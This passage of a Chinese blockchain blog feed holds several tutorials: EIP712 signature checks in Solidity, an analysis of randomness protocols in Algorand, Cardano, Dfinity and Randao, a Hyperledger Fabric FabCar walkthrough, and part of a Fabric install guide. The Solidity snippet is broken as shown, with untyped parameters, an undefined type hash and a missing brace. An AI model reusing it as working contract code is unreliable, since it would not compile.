&#125;); 在智能合约中添加验证签名代码按 EIP712 的要求，数据在签名前首先要进行格式化和相应的哈希计算。为了能够通过 ecrecover 来确定是哪个账户进行的数据签名，我们在合约里也要按同样的规则对数据进行格式化。 首先，需要在 solidity 代码里定义所需要的结构体类型。 12345678struct Identity &#123; uint256 userId; address wallet;&#125;struct Bid &#123; uint256 amount; Identity bidder;&#125; 然后，定义相应的类型格式串。 12string private constant IDENTITY_TYPE = "Identity(uint256 userId,address wallet)";string private constant BID_TYPE = "Bid(uint256 amount,Identity bidder)Identity(uint256 userId,address wallet)"; 再者，定义域分隔符的哈希值。 12345678910111213uint256 constant chainId = 1;address constant verifyingContract = 0x1C56346CD2A2Bf3202F771f50d3D14a367B48070;bytes32 constant salt = 0xf2d857f4a3edcb9b78b4d503bfe733db1e3f6cdc2b7971ee739626c97e86a558;string private constant EIP712_DOMAIN = "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract,bytes32 salt)";bytes32 private constant DOMAIN_SEPARATOR = keccak256(abi.encode( EIP712_DOMAIN_TYPEHASH, keccak256("Auction dApp"), keccak256("2"), chainId, verifyingContract, salt)); 还需要为每种数据类型定义一个计算哈希值的函数。 1234567891011121314151617function hashIdentity(Identity identity) private pure returns (bytes32) &#123; return keccak256(abi.encode( IDENTITY_TYPEHASH, identity.userId, identity.wallet ));&#125;function hashBid(Bid memory bid) private pure returns (bytes32)&#123; return keccak256(abi.encodePacked( "\\x19\\x01", DOMAIN_SEPARATOR, keccak256(abi.encode( BID_TYPEHASH, bid.amount, hashIdentity(bid.bidder) )) )); 最后，别忘了最关键的签名验证函数： 123function verify(address signer, Bid memory bid, sigR, sigS, sigV) public pure returns (bool) &#123; return signer == ecrecover(hashBid(bid), sigV, sigR, sigS);&#125; 本文作者为深入浅出社区共建者 Ashton ，喜欢他的文章可关注他的简书。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>以太坊</category>
      </categories>
      <tags>
        <tag>EIP712</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[区块链上的随机性（二） - Algorand、Cardano、Dfinity、Randao 项目分析]]></title>
    <url>%2F2019%2F04%2F22%2Frandomness-blockchain-2%2F</url>
    <content type="text"><![CDATA[本篇文章是上一篇文章区块链上的随机性（一）概述与构造的延续。作为区块链上的随机性系列文章的第二部分，本文介绍了目前主流的应用在区块链项目中的随机数协议，例如 Algorand、Cardano，Dfinity 和 Randao，并分析他们是如何使用第一部分所介绍的随机数协议核心以及它们的组合。 区块链项目中的应用本本会介绍以下四个项目：Algorand、Cardano，Dfinity 和 Randao 分别是如何利用上述三种基本的方案构建随机数生成协议的。注意本文并不会专门详细解释这四个项目的共识算法，只会介绍最基本的框架以帮助读者理解共识协议和随机数算法之间的联系。 AlgorandAlgorand （参考[1]）项目使用了基于 PoS 的混合共识协议，其共识过程利用了随机抽签。它的随机抽签所依赖的种子，从本质上讲，是通过取前 $t(t=1)$ 个输入来生成的，对应 随机性 概述与构造 文中的 v3.0b 版本的第一种方式。如下图 1 所示，Algorand 的共识过程要求节点先在本地抽签，即通过一个可验证随机函数 (Verifabale Random Function, VRF) 在节点的本地算出来一个可验证的确定的随机数。 图 1：Algorand 的共识协议 VRF 可以被看作是一种特殊的伪随机数发生器，如下图 2 所示，输入为消息 $m$ 和用户的私钥 $sk$，输出为结果 $y$ 和证明 $π$。需要补充的一点是，这里的“确定”指的是，这样的随机数是无法被用户操纵的，因为输入是根据上一轮随机数生成过程的公共信息 $m$ 以及每个节点自己的私钥 $sk$，这些都是被确定下来而不受用户操纵的。其中私钥是可以被公钥验证的；公共信息是每个人都可以看到，是唯一确定的，并且可被其他人验证。本地抽签得到本地随机数之后，每个人会立马知道自己是否被选中（结果是否落在某些区间内）。之后，被选中的人广播抽签结果、证明和候选区块到全网节点，根据区块的 priority (可被看作是依赖于抽签结果和用户所提交的区块的编号的一个函数) 大小选出来候选区块，而确定哪个区块的 priority 更大是需要做拜占庭共识的。这个时候，就需要再进行一轮本地抽签，所有的节点会自己知道是否被选中去做 BA（一个拜占庭类型的共识协议），即投票选自己认为的 priority 最高的候选区块。这样的 BA 投票会进行很多轮，每一轮都要重新进行一次本地抽签，以增加安全性，直到选出区块。 可以看出，Algorand 共识的本质就是我们每个人都生成一个确定的随机数，但是我们最终只想要一个随机数，这样我们才能根据最后确定的唯一的随机数去决定哪个块会被全网接受。这个时候的方案就是根据某种确定的规则从众多备选结果中取一个，方法是通过拜占庭共识达成一致。 图 2：伪随机数发生器 VRF CardanoCardano （参考[2]） 是基于 Ouroboros （参考[3]） 的一个项目，采用了基于 PoS 的共识协议。Ouroboros 这篇论文给出了一个可证明安全的 PoS 协议框架，但是并没有给出具体的实现，实现由 Cardano 完成。因此这里主要讲解 Cardano 在工程上采用的一个具体的方案。Cardano 所采用的方案也在第一篇所讲的三种方式之中。如图 4 所示，它的方案其实就是就是无分发者的秘密分享 + 承诺，也就是 v2.0 和 v3.0b 中的第二种方法的结合版。图 3 简单描述了它的共识协议，在它的 Genesis Block 里面会初始化一个随机数 $η$ ，这个随机数 $η$ 会在接下来的一个 epoch 里发挥作用，再下一个 epoch 会重新抽取新的随机数。这样就可以利用确定的抽签算法以这个随机数作为随机信标来确定谁的区块会在之后的某个 slot (简单来讲，指的是按照时间等量划分的时间窗口) 里被接受。一个 epoch 里的 slot 的数量是固定的，因此，有可能有的 slot 中会有不止一个节点被抽中，也有可能没有节点被抽中，具体解决方案不在本文讨论范围内。那么，初始化的随机数是怎么生成的呢？ Cardano 协议首先采用了标准的承诺-揭示方案，不过在之后多了一个将随机数做一次无分发者的公开可验证秘密分享 (Publicly Verifiable Secret Sharing, PVSS) 的步骤。即分发碎片并且广播证明之后揭示随机数。这时也许有参与者会跑路，没有揭示随机数，但是没有关系，这个时候剩下的参与者可以通过广播碎片把跑路的参与者的随机数恢复了。因此，这是一个有一定冗余度的随机数生成机制，但是同时带来了一定的健壮性。通过这个机制，只要恶意节点不超过一半，一定可以生成一个随机数。 图 3：Cardano 的共识协议 图 4：Cardano 的 DRB 模型 DfinityDfinity （参考[4]） 的共识算法和 Algorand 很像，如图 5 所示，协议里同样需要选举一个委员会，委员会会运行分布式随机信标 (Distributed Randomness Beacon, DRB) 协议得到随机数种子。这个协议后文会讲，为了理清共识协议的基本步骤，我们先假设 DRB 协议可以达成这些功能。通过这个随机数种子，加上每个节点自己的私钥，每个节点通过运行可验证随机函数 (VRF) 就可以算出自己的排名（这一点和 Algorand 一样）。同时，由于所有节点都会被分组，那么每一个节点应该被分配到哪一个组也是由随机数种子决定的。在所有的组中，再次通过随机数种子（上一轮）随机挑选出一个组，称之为该轮的委员会。每个节点有了自己的节点排名后，所有节点都可以提交候选区块，广播给所有的节点，但是大家在广播的过程中，诚实节点就会根据排名，给目前为止它收到的排名最高的块签名，签好后，广播给所有的节点，如果某一个区块获得 $1⁄2$ 以上的合法签名，这个区块被称之为已验证的区块。一旦诚实节点收到已验证的区块，这一轮就会立马结束，并将这个已验证区块广播给所有其他节点。 图 5: Dfinity 的共识协议 由此可见，DRB 协议生成的随机数种子至关重要。Dfinity 所采用的 DRB 协议实际上就是 v3.0b 的第三种方法——分布式密钥生成 + 门限签名。首先要有一个 DKG 协议来生成符合一定要求的总密钥对和密钥对份额，这个协议同样可以是 $(t,n)$ 门限的。通过这个协议，每个人获得密钥对份额，但是没有人知道总私钥是什么。每个节点使用自己的私钥份额对再上一个轮次的随机数和轮次进行签名，签完名将签名结果广播，每个节点都可以用总公钥验证每个签名。然后通过门限签名的恢复算法使用 $t$ 个签名恢复出来这一轮的总签名（相当于是使用总密钥对直接进行签名的结果）。整个过程的算法都是完全确定的，唯一不确定的是每个节点不知道其他节点的私钥份额是什么。Dfinity 比较特殊的地方在于采用基于 BLS 的门限签名，比起其他的门限签名方案，好处有两个。第一个好处就是一次购买，终生免费。协议只需要在一开始的阶段运行一次 DKG，进行密钥生成。之后的阶段只需要 $n$个人中 $t$ 个人提交有效的签名就可以生成随机数，协议就可以运行下去，这个过程是异步的。第二个好处就是确定性，无论哪 $t$ 个人提交，最后生成的随机数都是一样的确定的结果，没有节点可以操纵最后的结果（不超过安全边界的情况下）。 图 6: Dfinity 的 DRB 模型 RandaoRandao （参考[5]） 是基于以太坊合约的，用于在链上生成智能合约可用的随机数的一个项目。它采用的是 区块链上的随机性概述与构造 文中的 v3.0a 的方案。每个人在提交承诺的时候，都需要提交 $m$ 个 ETH 的押金，揭示过程会持续 $w$ 个区块时间。这里有三件事需要说明:第一点是，同一个地址的多个承诺只接受第一次。第二点是收集的全网提交的承诺数有最小数量的要求，如果没有收集到最够的数量，整个协议就会以失败的状态结束，然后再重新开始。第三点就是不按时揭示的地址的押金会被没收，并且一旦有人不揭示，协议就会以失败的状态结束，这样做为了确保随机数的公平性。协议的最后一步是 Randao 特别加入的——返还押金，给参与者奖励的步骤，其目的是给出激励，构建生态。 图 7：Randao 的 DRB 模型 随机数与共识随机数生成与共识协议有着千丝万缕的关系，主要体现为以下两点。 防止女巫攻击的方法之一是不可预测的随机抽签。不论是 PoW，还是 PoS，我们都可以理解为一种随机抽签的方法。不管公有链上的共识协议再怎么设计，包括比特币在内，都是在通过某种方式产生一定的随机性。矿工通过 PoW 竞争出块，使得出块的人变得不确定，从而防止了通过伪装大量节点获利的女巫攻击。 女巫攻击简单来讲，指的是一种网络内的少数节点控制多重身份以消除冗余备份的作用的攻击方式 区块链上的随机数安全依赖于共识协议。以 Randao 为例，针对 Fomo3D 的攻击同样对 Randao 有效。由于以太坊的激励机制和共识协议的特点，矿工会优先打包手续费高的交易，所以攻击者可以通过 Censorship Attack，人为调整打包区块时包含的交易，或者制造高手续费的垃圾交易，迅速的把区块的 Gas Limit 耗光，阻止其他人的特定交易上链。当 Randao 即将计算出的结果不理想时，可以通过这种方式强行将协议终止，令无辜的节点蒙受损失，自己从中获利。尽管这样的手段有时成本较高，但这样的攻击仍然有无法忽略的可能性发生，而这样的攻击之所以成立的原因，实际上根植于共识协议的设计。再例如 Grinding Attack。Fomo3D 采用了取上一个块的哈希值作为种子的方法生成随机数。这种情况下，矿工可以把所有的区块组织的可能性都试验出来，然后选择一种对自己最有利的方式打包交易。这种攻击手段就是 Grinding Attack。尽管这样的攻击手段有一定的成本，但是如果随机数所牵涉的利益足够，例如用在某些赌博游戏里，矿工想要从中获利非常容易。 因此，区块链上随机数的生成是需要上下文环境的，必须要给定情景。拿 Randao 来讲，如果它的某一个随机数的生成，只和 0.01 个 ETH 相关，那么攻击者将没有足够的理由去破坏它的公平性。如果押金不够多，那么 Randao 就有可能是不安全的。 参考文献[1] Gilad, Yossi, et al. “Algorand: Scaling byzantine agreements for cryptocurrencies.” Proceedings of the 26th Symposium on Operating Systems Principles. ACM, 2017.[2] “Cardano Settlement Layer Documentation.” Cardano. Web. 21 Apr. 2019.[3] Kiayias, Aggelos, et al. “Ouroboros: A provably secure proof-of-stake blockchain protocol.” Annual International Cryptology Conference. Springer, Cham, 2017.[4] Hanke, Timo, Mahnush Movahedi, and Dominic Williams. “Dfinity technology overview series, consensus system.” arXiv preprint arXiv:1805.04548 (2018).[5] Youcai Qian. “Randao: Verifiable Random Number Generation.” Randao. Web. 21 Apr. 2019. 本文依照 BY-NC-SA 许可协议转载，原文链接。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>随机数</tag>
        <tag>Algorand</tag>
        <tag>Cardano</tag>
        <tag>Dfinity</tag>
        <tag>Randao</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用Hyperledger Fabric开发第一个区块链应用]]></title>
    <url>%2F2019%2F04%2F22%2Ffabric-v1.4-first-app%2F</url>
    <content type="text"><![CDATA[本文示例源于fabric-samples中的fabcar 在这个例子中，我们通过一个简单的示例程序来了解Fabric应用是如何运行的。在这个例子中使用的应用程序和智能合约（链码）统称为FabCar。这个例子很好地提供了一个开始用于理解Hyperledger Fabric。在这里，你将学会如何开发一个应用程序和智能合约来查询和更新账本，如何利用CA来生成一个应用程序需要的用于和区块链交互的X.509证书。 我们使用应用程序SDk来执行智能合约中的查询更新账本的操作，这些操作在智能合约中借助底层接口实现。 我们将通过3个步骤来进行讲解： 搭建开发环境。我们的应用程序需要和网络交互，因此我们需要一个智能合约和应用程序使用的基础网络。 学习一个简单的智能合约：FabCar。我们使用JavaScript开发智能合约。我们通过查看智能合约来学习应用程序如何使用智能合约发送交易，如何使用智能合约来查询和更新账本。 使用FabCar开发一个简单的应用程序。我们的应用程序会使用FabCar智能合约来查询及更新账本上的汽车资产。我们将进入应用程序的代码中去了解如何创建交易，包括查询一辆汽车的信息，查询一批汽车的信息以及创建一辆汽车。 设置区块链网络 注意：下面的部分需要进入你克隆到本地的fabric-samples仓库的first-network子目录。 如果你已经学习了Building Your First Network，你应该已经下载了fabric-samples而且已经运行起了一个网络。在你进行本教程之前，你需要停止这个网络： 1./byfn.sh down 如果你之前运行过这个教程，使用下面的命令关掉所有停止或者运行的容器。注意，这将关掉所有的容器，不论是否和Fabric有关。 12docker rm -f $(docker ps -aq)docker rmi -f $(docker images | grep fabcar | awk '&#123;print $3&#125;') 如果你没有这个网络和应用相关的开发环境和构件，请访问 Prerequisites页面（或参考），确保你的机器安装了必要的依赖。 接下来，如果你还没有这样做的话，请浏览 Install Samples, Binaries and Docker Images页面，跟着上面的操作进行。当你克隆了fabric-samples仓库，下载了最新的稳定版Fabric镜像和相关工具之后回到教程。 如果你使用的是Mac OS和Mojava，你需要安装Xcode。 启动网络 下面的部分需要进入fabric-samples仓库的fabcar子目录。 使用startFabric.sh来启动你的网络。这个命令将启动一个区块链网络，这个网络由peer节点、排序节点、证书授权服务等组成。同时也将安装和初始化javascript版本的FabCar智能合约，我们的应用程序将通过它来操作账本。我们将通过本教程学习更过关于这些组件的内容。 1./startFabric.sh javascript 现在，我们已经运行起来了一个示例网络，还安装和初始化了FabCar智能合约。为了运行我们的应用程序，我们需要安装一些依赖，同时让我们看一下它们是如何工作的。 安装应用程序 注意：下边的章节需要进入你克隆到本地的fabric-samples仓库的fabcar/javascript子目录。下面的命令来安装应用程序所需的Fabric有关的依赖。大概将话费1分钟左右的时间： 1npm install 这个指令用于安装应用程序所需的依赖，这些依赖被定义在package.json中。其中最重要的是fabric-network类；它使得应用程序可以使用身份、钱包和连接到通道的网关，以及提交交易和等待通知。本教程也将使用fabric-ca-client类来注册用户以及他们的授权证书，生成一个fabric-network使用的合法的身份。 一旦npm install执行成功，运行应用程序所需的一切就准备好了。在这个教程中，你将主要使用fabcar/javascript目录下的JavaScript文件来操作应用程序。让我们来了解一下里面有哪些文件： 1ls 你将看到下列文件： 12enrollAdmin.js node_modules package.json registerUser.jsinvoke.js package-lock.json query.js wallet 里面也有一些其他编程语言的文件，比如fabcar/typescript目录中。当你使用过JavaScript示例之后-其实都是类似的。 如果你在使用Mac OS而且运行的是Mojava你需要[安装Xcode](https://hyperledger-fabric.readthedocs.io/en/latest/tutorial/installxcode.html)。 登记管理员用户 下面的部分涉及执行和CA服务器通讯的过程。你在执行下面的程序的时候，打开一个终端执行docker logs -f ca.example.com来查看CA的日志，会是十分有帮助的。 当我们创建网络的时候，一个叫admin的用户已经被授权服务器（CA）创建为登记员。我们第一步要做的是使用enroll.js程序为admin生成私钥，公钥和x.509证书。这个程序使用一个证书签名请求 (CSR)–先在本地生成私钥和公钥，然后把公钥发送到CA，CA会发布一个应用程序使用的证书。这三个凭证会保存在钱包中，以便于我们以管理员的身份使用CA。 接下来我们会注册和登记一个新的应用程序用户，我们将使用这个用户来通过应用程序和区块链进行交互。 让我们登记一个admin用户： 1node enrollAdmin.js 这个命令将CA管理员证书保存在wallet目录。 注册和登记user1现在我们在钱包里放了管理员的证书，我们可以登记一个新用户–user1–用这个用户来查询和更新账本： 1node registerUser.js 和登记管理员类似，这个程序使用了CSR来登记user1并把它的证书保存到admin所在的钱包中。现在我们有了2个独立的用户–admin和user1–它们都将用于我们的应用程序。 接下来是账本交互时间… 查询账本区块链网络中的每个节点都拥有一个账本的副本，应用程序可以通过执行智能合约查询账本上的最新舒徐来实现查询账本操作，将结果返回给应用程序。 这是一个如何查询的简单阐述： 应用程序使用查询从ledger读取数据。最常见的就是查询当前账本中的最新值–世界状态。世界状态是一个键值对的集合，应用程序可以根据一个键或者多个键来查询数据。而且，当键值对是以JSON形式存在的时候，世界状态可以通过配置使用数据库（例如CouchDB）来支持富查询。这个特性对于查询匹配特定的键的值是很有帮助的，比如查询一个人的所有汽车。 首先，让我们使用query.js程序来查询账本上的所有汽车。这个程序使用我们的第二个身份–user1–来操作账本。 1node query.js 输出结果如下： 123456789101112Wallet path: ...fabric-samples/fabcar/javascript/walletTransaction has been evaluated, result is:[&#123;"Key":"CAR0", "Record":&#123;"colour":"blue","make":"Toyota","model":"Prius","owner":"Tomoko"&#125;&#125;,&#123;"Key":"CAR1", "Record":&#123;"colour":"red","make":"Ford","model":"Mustang","owner":"Brad"&#125;&#125;,&#123;"Key":"CAR2", "Record":&#123;"colour":"green","make":"Hyundai","model":"Tucson","owner":"Jin Soo"&#125;&#125;,&#123;"Key":"CAR3", "Record":&#123;"colour":"yellow","make":"Volkswagen","model":"Passat","owner":"Max"&#125;&#125;,&#123;"Key":"CAR4", "Record":&#123;"colour":"black","make":"Tesla","model":"S","owner":"Adriana"&#125;&#125;,&#123;"Key":"CAR5", "Record":&#123;"colour":"purple","make":"Peugeot","model":"205","owner":"Michel"&#125;&#125;,&#123;"Key":"CAR6", "Record":&#123;"colour":"white","make":"Chery","model":"S22L","owner":"Aarav"&#125;&#125;,&#123;"Key":"CAR7", "Record":&#123;"colour":"violet","make":"Fiat","model":"Punto","owner":"Pari"&#125;&#125;,&#123;"Key":"CAR8", "Record":&#123;"colour":"indigo","make":"Tata","model":"Nano","owner":"Valeria"&#125;&#125;,&#123;"Key":"CAR9", "Record":&#123;"colour":"brown","make":"Holden","model":"Barina","owner":"Shotaro"&#125;&#125;] 让我们近距离看一下这个程序。使用文本编辑器（如atom或者visual studio）打开query.js。 应用程序开始的时候就从fabric-network模块引入了两个关键的类FileSystemWallet和Gateway。这两个类将用于定位钱包中user1的身份，并且使用这个身份连接网络： 1const &#123; FileSystemWallet, Gateway &#125; = require('fabric-network'); 应用程序使用网关连接网络： 12const gateway = new Gateway();await gateway.connect(ccp, &#123; wallet, identity: 'user1' &#125;); 这段代码创建了一个新的网关，然后通过它来让应用程序连接网络。cpp描述了网关通过wallet中的user1来连接网络。打开 ../../basic-network/connection.json来查看cpp是如何解析一个JSON文件的： 123const ccpPath = path.resolve(__dirname, '..', '..', 'basic-network', 'connection.json');const ccpJSON = fs.readFileSync(ccpPath, 'utf8');const ccp = JSON.parse(ccpJSON); 如果你想了解更多关于连接配置文件的结构以及它是怎么定义网络的，请查阅 the connection profile topic 一个网络可以被拆分成很多个通道，代码中下一个很重要的地方是将应用程序连接到特定的通道mychannel上： 在这个通道中，我们可以通过fabcar智能合约来和账本进行交互： 1const contract = network.getContract('fabcar'); 在fabcar中有许多不同的交易，我们的应用程序先使用queryAllCars交易来查询账本的世界状态： 1const result = await contract.evaluateTransaction('queryAllCars'); evaluateTransaction方法呈现了一种和区块链网络中的智能合约交互的最简单的方法。它只是根据配置文件中的定义连接一个节点，然后向节点发送请求，在节点内执行该请求。智能合约查询了节点账本上的所有汽车，然后把结果返回给应用程序。这次交互并没有更新账本。 FabCar 智能合约让我们看一看FabCar智能合约里的交易。进入fabric-samples下的子目录chaincode/fabcar/javascript/lib，然后用你的编辑器打开fabcar.js。 看一下我们的智能合约是如何通过Contract类来定义的： 1class FabCar extends Contract &#123;... 在这个类结构中，你将看到定义了以下交易： initLedger，queryCar，queryAllCars，createCar和changeCarOwner。例如： 12async queryCar(ctx, carNumber) &#123;...&#125;async queryAllCars(ctx) &#123;...&#125; 让我们更进一步看一下 queryAllCars ，看一下它是怎么和账本交互的。 123456async queryAllCars(ctx) &#123; const startKey = 'CAR0'; const endKey = 'CAR999'; const iterator = await ctx.stub.getStateByRange(startKey, endKey); 这段代码定义了 queryAllCars 将要从账本获取的汽车的范围。从 CAR0 到 CAR999 的每一辆车 – 一共 1000 辆车，假定每个键都被合适地锚定了 – 将会作为查询结果被返回。 代码中剩下的部分，通过迭代将查询结果打包成 JSON 并返回给应用。 下边将展示应用程序如何调用智能合约中的不同交易。每一个交易都使用一组 API 比如 getStateByRange 来和账本进行交互。了解更多API请阅读文档。 你可以看到我们的queryAllCars交易，还有另一个叫做createCar。我们稍后将在教程中使用他们来更新账本，和添加新的区块。 但是在那之前，返回到query程序，更改evaluateTransaction的请求来查询为CAR4。query程序现在如下： 1const result = await contract.evaluateTransaction('queryCar', 'CAR4'); 保存程序，然后返回到fabcar/javascript目录。现在，再次运行query程序： 1node query.js 你应该会看到如下所示： 123Wallet path: ...fabric-samples/fabcar/javascript/walletTransaction has been evaluated, result is:&#123;"colour":"black","make":"Tesla","model":"S","owner":"Adriana"&#125; 如果你查看一下之前queryAllCars的交易结果，你会看到CAR4是Adriana的黑色 Tesla model S，也就是这里返回的结果，是一样的。 我们可以使用queryCar交易来查询任意汽车，使用它的键（比如CAR0）得到车辆的制造商、型号、颜色和车主等相关信息。 非常好。现在你应该已经了解了智能合约中基础的查询交易，也手动修改了查询程序中的参数。 是时候进行更新账本了。 更新账本现在我们已经完成一些账本的查询操作，添加了一些代码，我们已经准备好更新账本了。我们进行更新操作了，但是我们从创建一辆新车开始。 从一个应用程序的角度来说，更新一个账本很简单。应用程序向区块链网络提交一个交易， 当交易被验证和提交后，应用程序会收到一个交易成功的提醒。但是在底层，区块链网络中各组件中不同的共识程序协同工作，来保证账本的每一个更新提案都是合法的，而且有一个大家一致认可的顺序。 上图中，我们可以看到完成这项工作的主要组件。同时，多个节点中每一个节点都拥有一份账本的副本，并可选的拥有一份智能合约的副本，网络中也有一个排序服务。排序服务保证网络中交易的一致性；它也将连接到网络中不同的应用程序的交易以定义好的顺序生成区块。 我们对账本的的第一个更新是创建一辆新车。我们有一个单独的程序叫做invoke.js，用来更新账本。和查询一样，使用一个编辑器打开程序定位到我们构建和提交交易到网络的代码段： 1await contract.submitTransaction('createCar', 'CAR12', 'Honda', 'Accord', 'Black', 'Tom'); 看一下应用程序如何调用智能合约的交易createCar来创建一辆车主为Tom的黑色Honda Accord汽车。我们使用CAR12作为这里的键，这也说明了我们不必使用连续的键。 保存并运行程序： 1node invoke.js 如果执行成功，你将看到类似输出： 123Wallet path: ...fabric-samples/fabcar/javascript/wallet2018-12-11T14:11:40.935Z - info: [TransactionEventHandler]: _strategySuccess: strategy success for transaction "9076cd4279a71ecf99665aed0ed3590a25bba040fa6b4dd6d010f42bb26ff5d1"Transaction has been submitted 注意inovke程序使用的是submitTransactionAPI和区块链网络交互的，而不是evaluateTransaction。 1await contract.submitTransaction('createCar', 'CAR12', 'Honda', 'Accord', 'Black', 'Tom'); submitTransaction比evaluateTransaction要复杂的多。不只是和单个节点交互，SDK将把submitTransaction提案发送到区块链网络中每一个必要的组织的节点。每一个节点都将根据这个提案执行请求的智能合约，并生成一个该节点签名的交易响应并返回给SDK 。SDK将所有经过签名的交易响应收集到一个交易中，这个交易将会被发送到排序节点。排序节点搜集并排序每个应用的交易，并把这些交易放入到一个交易区块。然后排序节点将这些区块分发到网络中的节点，每一笔交易都会在节点中进行验证和提交。最后，SDK会后到提醒，并把控制权返回给应用程序。 submitTransaction也会包括一个监听器用于确保交易已经被校验和提交到账本里了。应用程序需要利用监听器或者使用submitTransaction接口，它内部已经实现了监听器。如果没有监听器，你可能无法确定交易是否被排序校验以及提交。 应用程序中的这些工作由submitTransaction完成！应用程序、智能合约、节点和排序服务一起工作来保证网络中账本一致性的程序被称为共识。 为了查看这个被写入账本的交易，返回到query.js并将参数CAR4更改为CAR12。 换句话说就是将： 1const result = await contract.evaluateTransaction('queryCar', 'CAR4'); 改为： 1const result = await contract.evaluateTransaction('queryCar', 'CAR12'); 再次保存，然后查询： 1node query.js 将返回： 123Wallet path: ...fabric-samples/fabcar/javascript/walletTransaction has been evaluated, result is:&#123;"colour":"Black","make":"Honda","model":"Accord","owner":"Tom"&#125; 恭喜。你创建了一辆汽车并验证了它记录在账本上！ 现在我们已经完成了，我们假设Tom很大方，想把他的Honda Accord送给一个叫Dave的人。 为了完成这个，返回到invoke.js然后利用输入的参数，将智能合约的交易从createCar改为changeCarOwner： 1await contract.submitTransaction('changeCarOwner', 'CAR12', 'Dave'); 第一个参数 —CAR12— 表示将要易主的车。第二个参数 —Dave— 表示车的新主人。 再次保存并执行程序： 1node invoke.js 现在我们来再次查询账本，以确定Dave和CAR12键已经关联起来了： 1node query.js 将返回如下结果： 123Wallet path: ...fabric-samples/fabcar/javascript/walletTransaction has been evaluated, result is:&#123;"colour":"Black","make":"Honda","model":"Accord","owner":"Dave"&#125; CAR12的主人已经从Tom变成了Dave。 在实际的应用中，智能合约有权限控制逻辑。举个例子，只有有权限的用户可以创建新车，只有车子的拥有者可以转移车辆所属权。 总结现在我们已经完成了账本的查询和更新，你也应该比较了解如何通过智能合约和区块链进行交互来查询账本和更新账本了。在教程中已经讲解了查询和更新的智能合约，API和SDK，想必你对其他商业场景也有了一定的了解和认识。 通过FabCar这个例子，我们可以快速学习如何基于Node SDK开发应用程序。 本文经TopJohn授权转自TopJohn’s Blog 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博 掌握区块链技术动态。]]></content>
      <tags>
        <tag>Fabric</tag>
        <tag>Fabric入门</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fabric-V1.4安装配置 及 票据应用示例]]></title>
    <url>%2F2019%2F04%2F21%2Ffabric-v1.4-install-demo%2F</url>
    <content type="text"><![CDATA[Fabric-V1.4安装配置 及 票据应用示例 Fabric 1.4 更新内容Fabric已经发布到1.4LTS版本，各个版本对比如下： Fabric v1.1版本主要的新特性包括： Fabric CA的CRL 区块以及交易的事件推送 增加了所有组建间的双向TLS通信 Node.js Chaincode链码的支持 Chaincode API新增了creator identity 性能相对v1.0有了明显的提升 Fabric v1.2开始有了比较大的feature开始出现： Private Data Collections：这个特性不得不说在隐私保护上解决了不少项目的痛点，也减少了许多项目为了隐私保护在业务层做的复杂设计。 Service Discovery：服务发现这个特性，使得客户端拥有了更多的灵活性和可操作性，可以动态感知整个Fabric网络的变化。 Pluggable endorsement and validation：可插拔的背书及校验机制，采用了Go Plugin机制来实现，避免了之前需要重新编译源代码的操作，提升了灵活性。 Fabric v1.3中，同样增加了十分有用的feature： 基于Identity Mixer的MSP Implementation：基于零知识证明实现的身份的匿名和不可链接，这个特性替代了v0.6版本中的T-cert。 key-level endorsement policies：更细粒度的背书策略，细化到具体的key-value，更加灵活，不仅限于一个链码程序作背书。 新增Java Chaincode：至此，v1.3之后支持了Go、Node.js、Java 三种Chaincode，为开发者提供了更多的选择。 Peer channel-based event services：Channel级别的事件订阅机制，早在v1.1版本中已经亮相了，在v1.3版本中正式发布，至此，旧的Event Hub正式宣告弃用。 Fabric v1.4是一个里程碑式的版本，是首个LTS的版本（Long Term Support的版本）： 可操作性和可维护性的提升： 开放日志级别设置的接口 开放节点健康状态的检查接口 开放节点数据指标的收集接口 改进了Node SDK的编程模型，简化开发者的代码复杂度，使得SDK更加易用 Private Data的增强： 对于后续添加的允许访问节点能够获取之前的隐私数据 添加客户端层面的隐私数据的权限控制，不需要添加链码逻辑。 环境搭建准备工作实验环境这里作一个更新，新建Centos7.4的虚拟机环境。大致搭建过程如下。云主机：Centos 7.4 、CPU：4C、内存：16G，硬盘:200G。 相关前置软件安装关闭Selinux，关闭防火墙等相关操作，相关操作网络上随处可查。 建议更新后再进行下列操作： 1&gt; yum update 安装git、curl、pip12345&gt; yum install git&gt; yum install curl&gt; yum -y install epel-release&gt; yum install python-pip&gt; pip install --upgrade pip 安装docker相关1234&gt; yum install docker-ce# 或者：yum install docker-ce.18.06.3.ce-3.el7 指定具体版本，可以先设置好yum 源（yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo）&gt; pip install docker-compose #（可能会失败，那就用以下的命令）&gt; pip install docker-compose --ignore-installed requests 相关软件环境：安装完成后查看各个软件版本，如下图： 注： 可能会碰到docker-compose报错： 123File &quot;/usr/lib/python2.7/site-packages/paramiko/ssh_gss.py&quot;, line 55, in &lt;module&gt;GSS_EXCEPTIONS = (gssapi.GSSException,)AttributeError: &apos;module&apos; object has no attribute &apos;GSSException&apos; 那么通过修改配置文件:/usr/lib/python2.7/site-packages/paramiko/ssh_gss.py来解决: 1234vi /usr/lib/python2.7/site-packages/paramiko/ssh_gss.py53.55行修改如下解决：53：import gssapi.error55：GSS_EXCEPTIONS = (gssapi.error.GSSException,) 安装Golang、Node.js、npm安装Golang 如果单独去下载安装包麻烦的话，那么直接通过wget来下载解压，配置环境变量。 12wget https://studygolang.com/dl/golang/go1.10.8.linux-amd64.tar.gztar -xvf go1.10.8.linux-amd64.tar.gz 配置环境变量。修改/etc/profile文件,路径根据下载安装路径来。 12345vim /etc/profile添加export GOROOT=/usr/goexport GOPATH=/usr/gopathexport PATH=$PATH:$GOROOT/bin:$GOPATH/bin 安装Node.js 123456wget https://npm.taobao.org/mirrors/node/v11.0.0/node-v11.0.0.tar.gztar -xvf node-v11.0.0.tar.gz解压后进入Node文件夹：yum install gcc gcc-c++完成后gcc -v,这时候会发现gcc为4.8.5 建议更新：wget http://ftp.gnu.org/gnu/gcc/gcc-7.3.0/gcc-7.3.0.tar.gz 更新完成后，解压gcc，并安装： 123456789tar -xvf 